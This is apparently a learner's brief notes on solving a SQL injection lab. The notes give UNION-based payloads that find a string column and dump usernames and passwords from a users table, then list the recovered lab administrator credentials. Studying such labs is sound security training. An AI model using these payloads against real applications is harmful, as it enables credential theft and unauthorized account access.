==> SQLi lab 10
==> Goal: get the administrator's username and password and log in into account, union based attack, there is users table which contains username
and password columns

> see which column has string datatype
payload: ' UNION SELECT null,'a'--
200 OK respose means 2nd column has string datatype

> getting the username and passwords from users table
payload: for getting username: ' UNION SELECT null,username FROM users--
	 for getting passwords: ' UNION SELECT null,password FROM users--

notice the position of administrator in usernames(in this case its 4th) and when getting password copy the 4th string we get

here..
username: administrator (on 4th position)
password: 18gk3pv1m65tnfy2p702

la is solved congrats....
